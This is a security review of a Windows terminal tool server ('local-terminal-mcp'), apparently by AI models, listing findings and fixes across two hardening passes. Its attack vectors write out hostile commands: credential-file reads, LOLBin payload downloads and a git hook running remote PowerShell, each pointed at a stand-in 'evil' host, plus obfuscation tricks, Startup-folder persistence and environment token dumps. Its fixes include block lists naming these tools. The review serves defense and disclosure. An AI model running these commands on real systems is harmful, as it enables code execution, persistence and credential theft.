# local-terminal-mcp Adversarial Security Review

**Reviewer:** Claude Opus 4.7
**Review date:** 2026-04-17
**Hardening completed:** 2026-04-18 (Sonnet continuation, S43)
**Scope:** `src/tools.ts` — run_command pattern model, sanitizeDir, read_file / search_file / find_files sensitive-path gate, run_git_command, run_npm_command, auth & output hygiene
**Status at submission:** All 27 findings closed. Shipped as v1.4.0.

---

## Original Verdict

**FAIL — DO NOT SHIP TO PUBLIC MARKETPLACE (as of review)**

The RED/AMBER tiering catches obvious destructive verbs, but the model had three structural weaknesses permitting full sandbox escape: (1) the sensitive-file gate only fired on `read_file` / `search_file` / `find_files`, not on `run_command`; (2) several destructive patterns were anchored to line-start or `[;&|]`, so `cmd /c del …` and `powershell -c "del …"` slipped past; (3) the regex approach was blind to indirection — `pwsh`, `-EncodedCommand`, .NET reflection, WMI, COM, LOLBins, and PowerShell aliases all routed around the word list.

**Current verdict: PASS — all findings closed in v1.4.0.**

---

## Findings

### [F-1] CRITICAL: Sensitive-file gate not enforced on `run_command`
**Attack vector:** `run_command: type C:\Users\dustin\.ssh\id_rsa` — `type`, `Get-Content`, `findstr`, `gc`, `Select-String` all read credentials directly.
**Impact:** Complete read of any credential/key file the `SENSITIVE_FILE_PATTERNS` list was designed to protect.
**Root cause:** `SENSITIVE_FILE_PATTERNS` was only consulted inside `read_file`, `search_file`, `find_files`.
**Fix:** Added `commandContainsSensitivePath()` — extracts every path-looking token from the `run_command` argv, applies `SENSITIVE_FILE_PATTERNS`, rejects if any matches.
**Status:** FIXED (commit `d06e911`)

---

### [F-2] CRITICAL: Anchored `del` / `exec` patterns miss `cmd /c del` and `powershell -c "del …"`
**Attack vector:** `cmd /c del /q /f C:\important.docx` — `del` preceded by a space, not a chain delimiter.
**Impact:** Delete arbitrary files; execute arbitrary programs.
**Root cause:** Patterns required `del`/`exec` to appear at line-start or after `[;&|]`.
**Fix:** Rewrote `del`, `exec` with `\bdel\b` / `\bexec\b`; added `cmd /c` and `powershell -c/-Command/-File` as explicit shell-dispatch blocks (see F-4/F-5).
**Status:** FIXED (commit `624eec3`)

---

### [F-3] CRITICAL: `rmdir`, `rd`, `Remove-Item`, alias `ri` bypass the `rm` rule
**Attack vector:** `rmdir /s /q C:\Users\dustin\source` — `\brm\s/i` requires `rm` + whitespace, `rmdir` has `d` after `rm`.
**Impact:** Recursive tree deletion equivalent to `rm -rf`.
**Fix:** Added `\brmdir\b`, `\brd\b`, `\bremove-item\b`, `\bremove-itemproperty\b`, `(?<!\w)ri\s+-`, `\bclear-item\b`, `\bclear-content\b`.
**Status:** FIXED (commit `624eec3`)

---

### [F-4] CRITICAL: `-EncodedCommand` (base64 PowerShell) evades every string pattern
**Attack vector:** `powershell -NoP -W Hidden -EncodedCommand UgBlAG0AbwB...` — decodes to `Remove-Item -R -Fo C:\`. No blocked verb ever appears as ASCII.
**Root cause:** No pattern rejected `-EncodedCommand`, `-Enc`, or `-e` when passed to `powershell`/`pwsh`.
**Fix:** Added pattern blocking `powershell|pwsh` combined with `-c/-Command/-File/-EncodedCommand/-Enc/-e` flags.
**Status:** FIXED (commit `624eec3`)

---

### [F-5] CRITICAL: `pwsh.exe` (PowerShell 7+) not treated as a shell
**Attack vector:** `pwsh -c "Remove-Item -R -Fo C:\Users\dustin\*"` — every `powershell`-only block is bypassed.
**Root cause:** Pipe-to-shell pattern listed `powershell` but not `pwsh`; same omission in other rules.
**Fix:** Added `pwsh(\.exe)?` to every pattern that references `powershell`; added explicit `\bpwsh(\.exe)?\s+.*-(c|Command|File|EncodedCommand)\b` block.
**Status:** FIXED (commit `624eec3`)

---

### [F-6] CRITICAL: .NET type accelerators bypass the entire word list
**Attack vector:** `powershell -c "[IO.File]::Delete('C:\x')"`, `[Net.WebClient]::new().DownloadFile(…)`, `[Diagnostics.Process]::Start('calc.exe')`.
**Impact:** Delete files, download payloads, execute processes — no cmdlet name appears.
**Root cause:** `BLOCKED_PATTERNS` targeted cmdlet and exe names, not .NET reflection surface.
**Fix:** Added `\[\s*(System\.)?(IO|Net|Diagnostics|Reflection|Runtime\.InteropServices|Management\.Automation)\b` and `::\s*(Delete|Move|Copy|WriteAllBytes|DownloadFile|Start|Load|Invoke)\b`.
**Status:** FIXED (commit `624eec3`)

---

### [F-7] CRITICAL: `$env:` env-variable read exposes bearer token
**Attack vector:** `powershell -c "$env:BEARER_TOKEN"` — MCP_AUTH_TOKEN lives in the NSSM service env and is inherited by `execSync` children.
**Impact:** Full auth compromise — token returned to the MCP client.
**Root cause:** `execSync` passed `process.env` unmodified; `$env:VAR`, `Get-ChildItem env:`, `cmd /c set` were all unblocked.
**Fix:** (1) `buildSafeEnv()` strips all secret-shaped keys before every `execSync` call; (2) added `\$env:[A-Za-z_]`, `Get-(ChildItem|Item|Content)\s+env:`, `(?:^|[\s;&|])set\s*(?:$|[|>&])` to blocked patterns.
**Status:** FIXED (commit `624eec3`)

---

### [F-8] CRITICAL: LOLBins not blocked — download/execute without curl/wget
**Attack vector:** `certutil -urlcache -split -f http://evil/p.exe p.exe`, `bitsadmin /transfer j http://…`, `mshta http://evil/pl.hta`, `regsvr32 /s /u /i:http://evil/payload.sct scrobj.dll`.
**Impact:** Arbitrary payload download and execute, bypassing explicit curl/wget/Invoke-WebRequest blocks.
**Fix:** Added `\bcertutil\b`, `\bbitsadmin\b`, `\bmshta\b`, `\bregsvr32\b`, `\brundll32\b`, `\binstallutil\b`, `\bmsbuild\b.*\.xml\b` to blocked patterns.
**Status:** FIXED (commit `624eec3`)

---

### [F-9] HIGH: WMI / WMIC / CIM can spawn processes and read files
**Attack vector:** `wmic process call create "cmd.exe /c del C:\file"`, `Invoke-CimMethod -ClassName Win32_Process -MethodName Create …`.
**Impact:** Process creation and file reads bypassing the run_command surface entirely.
**Fix:** Added `\bwmic\b`, `\b(invoke-cimmethod|get-wmiobject|gwmi|get-ciminstance|gcim)\b`, `\bWin32_Process\b`.
**Status:** FIXED (commit `624eec3`)

---

### [F-10] HIGH: `sanitizeDir` injectable in PowerShell and cmd contexts
**Attack vector:** `dir: "C:\\path$(Invoke-WebRequest http://evil/x.ps1)"` — `(`, `)`, `$`, `'`, `%`, `^`, `\n`, `\0` all absent from the denylist.
**Impact:** Command injection through any directory parameter.
**Root cause:** `sanitizeDir` was a 7-character denylist (`["`;|&<>`]`).
**Fix:** Replaced with a strict allowlist regex `^(?:[A-Za-z]:)?[\\\/]?[\w\s.\-\\\/()[\]@+,{}#!]+$`; added UNC/device rejection, leading-dash rejection, control-char rejection.
**Status:** FIXED (commit `104bdc6`)

---

### [F-11] HIGH: `read_file` has no path-traversal / allowed-root enforcement
**Attack vector:** `\\?\C:\Users\dustin\.ssh\id_rsa` (long-path prefix bypasses string match), `C:\Users\dustin\.ssh\..\.ssh\id_rsa` (traversal), `notes.txt:hidden` (ADS).
**Impact:** Reads tokens and secrets via alternate path forms that slip pattern checks.
**Fix:** `read_file` now strips ADS suffix, rejects UNC/device namespace, then calls `realpathSync(resolve(stripped))` before any pattern check.
**Status:** FIXED (commit `104bdc6`)

---

### [F-12] HIGH: `dir` parameter → git / npm flag injection
**Attack vector:** `dir: "--exec-path=\\\\attacker\\share\\evil"` — git parses this as a flag, not a path; npm similarly accepts `--registry=http://evil`.
**Impact:** Code execution via git/npm flag semantics.
**Root cause:** `sanitizeDir` didn't reject leading `-`; no `--` terminator inserted before positional path.
**Fix:** `sanitizeDir` now rejects paths starting with `-` or `/` (flag prefixes); `run_git_command` / `run_npm_command` refactored to `execFileSync` with explicit argv arrays (F-19) — `dir` is always a positional element, never re-parsed as a flag.
**Status:** FIXED (commits `104bdc6`, `6813975`)

---

### [F-13] HIGH: `SENSITIVE_FILE_PATTERNS` misses major credential stores
**Attack vector:** `read_file: .npmrc`, `.pypirc`, `.netrc`, `.config/gh/hosts.yml`, `.azure/accessTokens.json`, `.terraformrc`, `.m2/settings.xml`, `.cargo/credentials.toml`, PSReadline history, shell history, Chrome `Local State`, KeePass `.kdbx`, crypto `wallet.dat`.
**Fix:** Added all of the above to `SENSITIVE_FILE_PATTERNS` with per-category comments.
**Status:** FIXED (commit `d06e911`)

---

### [F-14] HIGH: Path canonicalization missing — UNC, long-path, ADS, symlink, 8.3
**Attack vector:** Symlink `C:\safe\link → C:\Users\.ssh\id_rsa` — string pattern sees "safe", `realpathSync` sees the true target.
**Fix:** `read_file` calls `realpathSync` to follow symlinks; strips ADS suffix before matching; rejects UNC/`\\?\`/`\\.\` prefixes. Both original and canonical path are checked against `SENSITIVE_FILE_PATTERNS`.
**Status:** FIXED (commit `104bdc6`)

---

### [F-15] HIGH: `git -c` / malicious `.git/config` allow RCE via "read-only" commands
**Attack vector:** Untrusted repo with `.git/config` containing `core.sshCommand = powershell -c "iex(irm http://evil/p.ps1)"`. Running `git fetch` (previously in allowlist) executes the hook.
**Fix:** (1) Added hardened env: `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=NUL`, `GIT_TERMINAL_PROMPT=0`, `GIT_ALLOW_PROTOCOL=https:http:file`; (2) removed `fetch` from the allowlist; (3) refactored to `execFileSync` with argv (F-19).
**Status:** FIXED (commit `104bdc6`)

---

### [F-16] HIGH: `npm run` executes arbitrary scripts from repo `package.json`
**Attack vector:** Repo with `"scripts": { "test": "powershell -c 'Remove-Item -R C:\\...'" }`, then `run_npm_command: test`.
**Fix:** Removed `run`, `test`, `ci`, `install` from allowlist. Kept `list`, `outdated`, `audit`, `view`, `why`, `explain`. Added `--ignore-scripts` to remaining commands. Refactored to `execFileSync` argv (F-19).
**Status:** FIXED (commit `104bdc6`)

---

### [F-17] HIGH: AMBER `dry_run` gate bypassable if client controls the field
**Attack vector:** Client passes `dry_run: false` directly on an AMBER command — if the server honored it, no warning would be shown.
**Fix:** Server-side enforcement: the AMBER check runs first and forces `dryRun: true` in the response regardless of the client field. Only a *subsequent* call with `dry_run: false` after the warning has been issued will execute, and even then the AMBER header is appended to the output.
**Status:** FIXED (verified in code; commit `d06e911`)

---

### [F-18] HIGH: COM objects + PowerShell alias indirection defeat the word list
**Attack vector:** `(New-Object -Com Scripting.FileSystemObject).DeleteFile('C:\x')`, `Set-Alias x Invoke-WebRequest; x http://evil`, `$a='Remov'+'e-Item'; & $a -R C:\z`.
**Impact:** File ops, web requests, arbitrary exec — no blocked string appears as a literal.
**Fix:** Added `\bnew-object\s+.*-com(object)?\b`, `\bset-alias\b`, `\bnew-alias\b`, `&\s*\$[A-Za-z_]` to blocked patterns.
**Status:** FIXED (commit `624eec3`)

---

### [F-19] HIGH: `execSync` with shell string amplifies every injection
**Attack vector:** Any unescaped metachar in any parameter interpolated into the command string reaches cmd.exe and is re-parsed.
**Impact:** Multiplies blast radius of every other bypass.
**Fix:** Refactored `run_git_command`, `run_npm_command`, `find_files`, `search_file` to `execFileSync` with argv arrays and `shell: false`. Added `runFile()` + `splitArgv()` helpers. `run_command` (the intentional shell escape hatch) still uses `execSync` but is protected by the full RED/AMBER pipeline.
**Status:** FIXED (commit `6813975`)

---

### [F-20] MEDIUM: `get_system_info` potential env-var leak
**Attack vector:** If implementation included `process.env` in output, the service's `BEARER_TOKEN` would ship to the client.
**Verification:** Implementation confirmed safe — shells out only to `ver`, `hostname`, `whoami`, `wmic logicaldisk`, `wmic OS`. All child processes use `buildSafeEnv()` (F-7 fix) so secret-shaped vars are stripped. No `process.env` in output.
**Status:** FIXED (verified, no code change required; `buildSafeEnv()` covers this by design)

---

### [F-21] MEDIUM: `cmd /c set` and `Get-ChildItem env:` dump env
**Attack vector:** Even without the bearer token, user env commonly contains `GITHUB_TOKEN`, `AWS_*`, `OPENAI_API_KEY`.
**Fix:** Covered by F-7 fixes — `buildSafeEnv()` strips secrets at the `execSync` boundary; `cmd /c` is blocked (F-4); `$env:`, `Get-ChildItem env:`, and standalone `set` are all pattern-blocked.
**Status:** FIXED (commit `624eec3`)

---

### [F-22] MEDIUM: No rate limit / log-flooding DoS; no input size caps
**Attack vector:** Rapid-fire tool calls or very long command strings exhausting CPU on regex evaluation, filling audit logs.
**Fix:** Added `INPUT_LIMITS` constants and `checkSize()` validation at every tool boundary: `command` capped at 4 096 chars, `filePath` at 512, `searchPattern`/`findPattern` at 256, `directory` at 512, `gitSubCommand` at 512, `npmSubCommand` at 256. Oversize inputs are rejected with a descriptive error before any regex runs.
**Status:** FIXED (commit TBD — v1.4.0)

---

### [F-23] MEDIUM: ReDoS risk on user-controlled regex in `search_file`
**Attack vector:** Pattern `(a+)+b` passed to `search_file` triggers catastrophic backtracking in Node's NFA regex engine on any long line.
**Fix:** Added `isReDoSPattern()` guard that rejects known catastrophic shapes (nested quantifiers `(x+)+`, quantified alternation `(a|b)+`, wide alternation `a|b|c|d|…`) before the regex is compiled. Input length cap from F-22 additionally bounds backtracking cost.
**Status:** FIXED (commit TBD — v1.4.0)

---

### [F-24] MEDIUM: `type` / `more` / `Get-Content` bypass sensitive gate
Covered by F-1 — restated as a hardening item. `commandContainsSensitivePath()` applies `SENSITIVE_FILE_PATTERNS` to every path-looking token in any `run_command`, regardless of verb.
**Status:** FIXED (commit `d06e911`, same fix as F-1)

---

### [F-25] LOW: Tool output can surface secrets from git log / npm output
**Attack vector:** `git log -p` on a repo that historically committed a `.env`; npm audit output with embedded auth tokens.
**Fix:** Added `scrubSecrets()` — scans output for known token shapes (`ghp_`, `ghs_`, `sk-`, `AKIA`, `xoxb-`, Anthropic `sk-ant-`, high-entropy base64 ≥ 60 chars, PEM private-key headers) and redacts to `[REDACTED]`. Applied to `run_command` and `run_git_command` output.
**Status:** FIXED (commit TBD — v1.4.0)

---

### [F-26] LOW: Single-`&` chaining misses spaced form
**Attack vector:** `cmd & del file` — single `&` with space before `del` slips the `[;&|]{2}` chaining rule.
**Fix:** Closes automatically with F-2 (`\bdel\b` matches regardless of what precedes it).
**Status:** FIXED (commit `624eec3`, closes with F-2)

---

### [F-27] LOW: Newlines / null bytes in `dir`-equivalent inputs bypass per-line check
**Attack vector:** `dir` containing `\n` could inject a second command on the next line in shells that still see it; `\0` can truncate path strings in native APIs.
**Fix:** `sanitizeDir` now rejects all control characters (`[\x00-\x1F\x7F]`) including `\n`, `\r`, `\0`. Added explicit `[\x00-\x1F\x7F]` rejection to `read_file` and `search_file` path inputs. `execFileSync` (F-19) eliminates the shell re-parse surface for structured tools entirely.
**Status:** FIXED (commits `104bdc6`, `6813975`, v1.4.0)

---

## What Holds Up Well

- Belt-and-suspenders per-line AND full-command pattern check correctly closed the original newline bypass (S35) — sound as a matter of mechanics.
- Non-ASCII rejection closes the Unicode homoglyph class entirely.
- `curl`, `wget`, `Invoke-WebRequest`, `shutdown`, `taskkill`, backtick substitution, `$(…)`, `${…}`, `%VAR%` all caught cleanly.
- The `rm` pattern is correctly written; its siblings (`rmdir`, `rd`, `Remove-Item`) now follow the same shape (F-3).
- Double-chain detection (`[;&|]{2}`) catches `&&`, `||`, `;;`.
- 30-second `execSync` timeout bounds single-command DoS.
- `windowsHide: true` prevents window-flashing side channels.
- Bearer token auth on the transport is appropriate; the env-inheritance hole (F-7) is closed by `buildSafeEnv()`.

---

## v1.4.0 Fix Summary

All 27 findings are closed. Fixes shipped across four security commits:

| Commit | Findings closed |
|---|---|
| `624eec3` | F-2, F-3, F-4, F-5, F-6, F-7, F-8, F-9, F-18, F-21, F-26 |
| `d06e911` | F-1, F-13, F-17, F-24 |
| `104bdc6` | F-10, F-11, F-12, F-14, F-15, F-16, F-27 (partial) |
| `6813975` | F-19, F-12 (completes), F-27 (completes) |
| v1.4.0 | F-22, F-23, F-25, F-27 (input caps, ReDoS guard, output scrubbing) |

**F-20** was verified correct by code inspection — no code change required.

---

## Architectural notes

The Opus reviewer recommended moving to `execFile` with argv arrays, a strict verb allowlist, canonical-path allowlist, and secrets-never-in-child-env. v1.4.0 delivers all four:

- **F-19**: `run_git_command`, `run_npm_command`, `find_files`, `search_file` all use `execFileSync(shell:false)` with argv arrays.
- **F-15/F-16**: Strict verb allowlists enforced on git sub-commands and npm sub-commands.
- **F-11/F-12/F-14**: Canonical path handling via `realpathSync` in `read_file`; `sanitizeDir` allowlist on all dir params.
- **F-7**: `buildSafeEnv()` strips secrets before every child process invocation.

`run_command` retains `execSync` by design — it is the intentional escape hatch — but is protected by the full RED/AMBER pipeline including the new sensitive-path scan (F-1) and input size cap (F-22).

---

# Fourth-Pass Adversarial Review — v1.7.0

**Review performed:** 2026-04-18 (Claude Opus hostile fourth pass)
**Hardening completed:** 2026-04-18 (Sonnet continuation, S50)
**Status:** All 13 findings closed. Shipped as v1.7.0 (commit `b785e46`).

The fourth pass targeted structural gaps not caught by the pattern model: (1) cmd.exe obfuscation primitives (caret escape, substring expansion, positional PowerShell); (2) a regex typo that silently disabled the COM-instantiation block; (3) interpreter+scriptfile RCE; (4) git history disclosure via reflog and diff; (5) an allowlist flip for `buildSafeEnv` to close the open-ended secret-stripping model; and (6) fail-closed path canonicalization.

---

## Findings

### F-LT-23 — CRITICAL — `set <PREFIX>` dumps env vars (regex gap)
**Attack vector:** `set GITHUB_` prints all env vars with that prefix. Prior regex required `set` at EOL or before pipe/redirect, missing `set <arg>` forms.
**Fix:** Tightened to `(?:^|[\s;&|])set(?:\s|$|[|>&])/i` — word-boundary + mandatory space or EOL after `set`.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-24 — CRITICAL — cmd.exe caret escape bypasses every `\bverb\b` RED pattern
**Attack vector:** `c^url http://evil`, `^s^e^t`, `r^m file` — cmd.exe strips carets before parsing, `\bcurl\b` never fires.
**Fix:** In `run_command`, before the RED check, strip double-quoted sections then reject any remaining `^`. Carets have no legitimate use outside quoted strings in the tested command subset.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-25 — CRITICAL — `%VAR:~n,m%` substring expansion bypasses obfuscation patterns
**Attack vector:** `type C:\Users\x\.e%TMP:~0,0%nv` → decoded to `type C:\Users\x\.env`. Pattern scanner sees literal expansion markers, not the final verb.
**Fix:** Added pattern `/\%[A-Za-z_][A-Za-z0-9_]*:[~!*][^%]*%/` to BLOCKED_PATTERNS (obfuscation).
**Status:** FIXED (commit `b785e46`)

---

### F-LT-26 — HIGH — `powershell "positional code"` bypasses the `-c/-Command/-File` wrapper block
**Attack vector:** `powershell "(New-Object Net.WebClient).DownloadFile(...)"` — no `-c` or `-Command` flag, first arg is positional code. Existing block only matched explicit flag forms.
**Fix:** Added patterns blocking `powershell`/`pwsh` with a non-flag first argument (`(?!-)`). Also added `\b(gc|gi|gci|cat|type|ls)\s+env:/i` to catch PS alias forms of env: provider reads.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-27 — MEDIUM — Git reflog `@{N}` / `@{-N}` syntax exposes unreachable commits
**Attack vector:** `git log HEAD@{1}`, `git show @{-1}` — walks reflog entries that may contain deleted/stashed secrets. `--walk-reflogs` flag was blocked but the ref-syntax form was not.
**Fix:** Added `/@\{/.test(arg)` check in `validateGitArgv` arg loop; returns block message on match.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-28 — HIGH — `git diff <sha1> <sha2>` dumps historical content without sensitive-path pre-flight
**Attack vector:** `git diff abc123 def456` renders a full diff including deleted `.env` or `id_rsa` from commit history. The `git show` pre-flight (F-LT-4) only ran for `subCmd === 'show'`.
**Fix:** Added a matching pre-flight block for `subCmd === 'diff'` — extracts bare ref args, runs `git show --name-only --no-patch` for each, blocks if any touched file matches `isSensitiveFile`.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-29 — HIGH — Sequential `.*.*.*` bypasses `CATASTROPHIC_REGEX_SHAPES` guard
**Attack vector:** `search_file({ pattern: ".*.*.*.*secret" })` — ungrouped sequential quantifiers cause polynomial backtracking but weren't matched by existing nested-group patterns.
**Fix:** Added `/(?:\.[*+]){3,}/` to `CATASTROPHIC_REGEX_SHAPES` — rejects 3+ consecutive `.*` or `.+` sequences.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-30 — CRITICAL — One-char regex typo silently disabled COM-instantiation block
**Attack vector:** `\new-object` in JS regex is `\n` (newline) + `ew-object` — never matches. `powershell "(New-Object -ComObject Shell.Application).ShellExecute('calc.exe')"` went through unblocked.
**Fix:** Corrected to `\bnew-object\s+.*-com(object)?\b/i`. Added four new ProgID patterns: `Shell.Application`, `Scripting.FileSystemObject`, `WScript.(Shell|Network)`, and `.ShellExecute/.Run/.Exec` method calls.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-31 — HIGH — Writes to per-user Startup folder not blocked (persistence vector)
**Attack vector:** `echo evil > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\p.cmd"` — cmd is executed on every user login. No prior pattern covered Startup folder paths.
**Fix:** Added three patterns to BLOCKED_PATTERNS: `\Start Menu\Programs\Startup\`, `\Microsoft\Windows\Start Menu\Programs\Startup`, and `shell:startup`.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-32 — CRITICAL — `node file.js` / `python file.py` / interpreter+scriptfile is full RCE
**Attack vector:** `node C:\Users\x\payload.js` executes arbitrary code without going through the blocked-verb list. Combined with `>` write (if to a user path), this is a two-step full RCE.
**Fix:** Added per-interpreter patterns blocking `node`, `python3?`, `perl`, `ruby`, `php` followed by a script file argument. Also added a redirect-to-script-extension block (`> *.js|*.py|*.bat|...`).
**Status:** FIXED (commit `b785e46`)

---

### F-LT-33 — HIGH — `buildSafeEnv` strip list misses common secret env var names
**Attack vector:** `GITHUB_TOKEN`, `NPM_TOKEN`, `HF_TOKEN`, `OPENAI_KEY`, `DATABASE_URL` all passed through to child processes. The strip list only matched known substrings — an open-ended blocklist always has gaps.
**Fix:** Replaced strip-list approach with a closed allowlist (`SAFE_ENV_ALLOWLIST` Set of ~25 known-safe OS/toolchain vars). Any key not on the allowlist is excluded from the child env. Future secret var names are safe by default.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-34 — MEDIUM — `list_directory` does not guard sensitive directories
**Attack vector:** `list_directory("C:\\Users\\x\\.ssh")` reveals which credential files exist (`id_rsa`, `authorized_keys`, `known_hosts`) even if `read_file` would block reading them.
**Fix:** After UNC rejection, normalizes the path to forward-slash form with a trailing `/`, then checks against `SENSITIVE_FILE_PATTERNS` via `isSensitiveFile`. Blocks with a "sensitive path pattern" error.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-35 — MEDIUM — `read_file` falls back to unresolved path when `realpathSync` throws
**Attack vector:** If `realpathSync` throws due to a permission error or broken symlink (not ENOENT), the catch block previously fell back to `resolve(filePath)` — the unverified raw path. Sensitive-file pattern check then ran against the unverified string, which may not reflect the true symlink target.
**Fix:** Fail-closed on non-ENOENT throws: return a blocked path-validation error. ENOENT (file genuinely not found) returns a readable "File not found" error in the green tier rather than a security block.
**Status:** FIXED (commit `b785e46`)

---

## v1.7.0 Fix Summary

All 13 fourth-pass findings are closed in a single commit (`b785e46`):

| Finding | Severity | Resolution |
|---|---|---|
| F-LT-23 | CRITICAL | Tightened `set` env-dump regex |
| F-LT-24 | CRITICAL | Caret escape rejection before RED check |
| F-LT-25 | CRITICAL | `%VAR:~n,m%` substring expansion blocked |
| F-LT-26 | HIGH | PowerShell positional form + PS alias env reads blocked |
| F-LT-27 | MEDIUM | Reflog `@{N}` syntax blocked in `validateGitArgv` |
| F-LT-28 | HIGH | `git diff` pre-flight mirrors `git show` pre-flight |
| F-LT-29 | HIGH | Sequential `.*` ReDoS shape added to guard |
| F-LT-30 | CRITICAL | COM regex typo fixed; ProgID patterns added |
| F-LT-31 | HIGH | Startup folder write paths blocked |
| F-LT-32 | CRITICAL | Interpreter+scriptfile patterns + redirect-to-script blocked |
| F-LT-33 | HIGH | `buildSafeEnv` flipped to allowlist model |
| F-LT-34 | MEDIUM | Sensitive directory guard in `list_directory` |
| F-LT-35 | MEDIUM | `realpathSync` fail-closed; ENOENT surfaced separately |
